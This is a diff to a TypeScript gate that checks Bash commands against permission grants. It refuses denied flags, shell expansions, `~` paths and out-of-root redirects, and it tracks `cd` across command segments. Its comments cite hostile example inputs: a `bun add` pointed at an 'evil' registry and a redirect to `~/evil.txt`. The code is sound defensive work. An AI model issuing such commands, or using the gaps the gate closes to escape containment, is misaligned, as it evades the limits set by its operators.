@@ -36,7 +36,10 @@ export interface BashCheckArgs {
   readonly askEntry?: CompiledEntry;
   /** Absolute resolved path, or null when the candidate escapes the root or
    * enters `.git/`. Supplied by policy.ts (see the header). */
-  readonly resolvePath: (candidate: string) => string | null;
+  /** Resolves a candidate from an effective shell working directory. */
+  readonly resolvePath: (candidate: string, cwd: string) => string | null;
+  /** The shell's initial working directory. */
+  readonly initialPath: string;
 }
 
 function deny(reason: string, breach = false): BashCheck {
@@ -49,9 +52,9 @@ function deny(reason: string, breach = false): BashCheck {
  *
  * - a TRAILING `*` is OPTIONAL, because the spec requires `Bash(bun test *)`
  *   to admit bare `bun test` as well as `bun test src/x.test.ts`;
- * - an OPAQUE token (one that contained `$`-expansion) is matched only by a
- *   bare `*` pattern token. A rule naming a literal must never be satisfied by
- *   a word whose runtime value this gate cannot see.
+ * - an OPAQUE token (one that contained `$`-expansion) can match only a bare
+ *   `*` pattern token during grant evaluation. Payload validation then refuses
+ *   it, because its runtime value cannot be contained safely.
  */
 function matchesTokens(patternTokens: readonly CompiledPattern[], tokens: readonly BashToken[]): boolean {
   const required =
@@ -112,61 +115,98 @@ function containmentTarget(text: string): string {
   return text;
 }
 
-function checkPayload(args: BashCheckArgs, segment: BashSegment): BashCheck | undefined {
+function hasUnmodelledExpansion(text: string): boolean {
+  return ["*", "?", "[", "]", "{", "}"].some((character) => text.includes(character));
+}
+
+function resolveAll(args: BashCheckArgs, candidate: string, cwd: readonly string[]): readonly string[] | undefined {
+  const resolved = cwd.map((directory) => args.resolvePath(candidate, directory));
+  return resolved.every((path): path is string => path !== null) ? resolved : undefined;
+}
+
+function checkPayload(
+  args: BashCheckArgs,
+  segment: BashSegment,
+  cwd: readonly string[],
+): { readonly refusal?: BashCheck; readonly cdTargets?: readonly string[] } {
   const words = segment.tokens.map((token) => token.text);
 
   // Same list and normalizer as Exec: a prefix grant gates the verb, never the
   // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
   const flag = deniedFlag(words);
-  if (flag !== undefined) return deny(`flag ${flag} is not permitted in a Bash command`);
+  if (flag !== undefined) return { refusal: deny(`flag ${flag} is not permitted in a Bash command`) };
 
   for (const token of segment.tokens) {
-    // An opaque word has no value here, so containment cannot judge it — and it
-    // already cannot satisfy a literal rule token (see matchesTokens).
-    if (token.opaque) continue;
+    if (token.opaque || hasUnmodelledExpansion(token.text)) {
+      return { refusal: deny(`token "${token.text}" depends on shell expansion this gate cannot resolve`) };
+    }
     const target = containmentTarget(token.text);
     if (target.startsWith("~")) {
-      return deny(
-        `token "${token.text}" addresses "${target}", which starts with "~" and depends on expansion this gate cannot resolve`,
-      );
+      return {
+        refusal: deny(
+          `token "${token.text}" addresses "${target}", which starts with "~" and depends on expansion this gate cannot resolve`,
+        ),
+      };
     }
-    if (args.resolvePath(target) === null) {
-      return deny(
-        `token "${token.text}" addresses "${target}", which resolves outside the permitted root, or into .git/`,
-        true,
-      );
+    if (resolveAll(args, target, cwd) === undefined) {
+      return {
+        refusal: deny(
+          `token "${token.text}" addresses "${target}", which resolves outside the permitted root, or into .git/`,
+          true,
+        ),
+      };
     }
   }
 
+  let cdTargets: readonly string[] | undefined;
   // `cd` moves every LATER segment's frame of reference, so its target is
   // containment-checked even when it carries no separator (`cd ..`).
   if (words[0] === "cd") {
     const target = segment.tokens[1];
-    if (target === undefined) return deny("`cd` with no target is refused");
-    if (target.opaque || args.resolvePath(target.text) === null) {
-      return deny(`cd target "${target.text}" is not inside the permitted root`, true);
-    }
+    if (target === undefined) return { refusal: deny("`cd` with no target is refused") };
+    const targets = resolveAll(args, target.text, cwd);
+    if (target.opaque || targets === undefined)
+      return { refusal: deny(`cd target "${target.text}" is not inside the permitted root`, true) };
+    cdTargets = targets;
   }
 
   for (const redirect of segment.redirects) {
     if (redirect.opaque) {
-      return deny(`redirect target "${redirect.target}" depends on expansion this gate cannot resolve`);
+      return { refusal: deny(`redirect target "${redirect.target}" depends on expansion this gate cannot resolve`) };
     }
     // Redirect targets are NOT in `segment.tokens`, and `resolveWithin` does not
     // expand `~`: it would read `~/evil.txt` as the literal `<root>/~/evil.txt`
     // and wave it through, while `/bin/sh` writes to `$HOME/evil.txt`. Mirrors
     // the `~` guard on the token loop above.
     if (redirect.target.startsWith("~")) {
-      return deny(
-        `redirect target "${redirect.target}" starts with "~", which depends on expansion this gate cannot resolve`,
-      );
+      return {
+        refusal: deny(
+          `redirect target "${redirect.target}" starts with "~", which depends on expansion this gate cannot resolve`,
+        ),
+      };
     }
-    if (args.resolvePath(redirect.target) === null) {
-      return deny(`redirect target "${redirect.target}" resolves outside the permitted root`, true);
+    if (hasUnmodelledExpansion(redirect.target)) {
+      return {
+        refusal: deny(`redirect target "${redirect.target}" depends on shell expansion this gate cannot resolve`),
+      };
+    }
+    if (resolveAll(args, redirect.target, cwd) === undefined) {
+      return { refusal: deny(`redirect target "${redirect.target}" resolves outside the permitted root`, true) };
     }
   }
 
-  return undefined;
+  return { cdTargets };
+}
+
+function nextWorkingDirectories(
+  segment: BashSegment,
+  current: readonly string[],
+  cdTargets: readonly string[] | undefined,
+): readonly string[] {
+  if (cdTargets === undefined) return current;
+  if (segment.separator === "&&") return cdTargets;
+  if (segment.separator === ";") return [...new Set([...current, ...cdTargets])];
+  return current;
 }
 
 export function checkBashCommand(args: BashCheckArgs): BashCheck {
@@ -197,9 +237,11 @@ export function checkBashCommand(args: BashCheckArgs): BashCheck {
     return deny(`${tool} is not granted "${render(segment)}" -- ${alternatives}`);
   }
 
+  let cwd: readonly string[] = [args.initialPath];
   for (const segment of lexed.segments) {
-    const refusal = checkPayload(args, segment);
-    if (refusal !== undefined) return refusal;
+    const result = checkPayload(args, segment, cwd);
+    if (result.refusal !== undefined) return result.refusal;
+    cwd = nextWorkingDirectories(segment, cwd, result.cdTargets);
   }
 
   for (const segment of lexed.segments) {
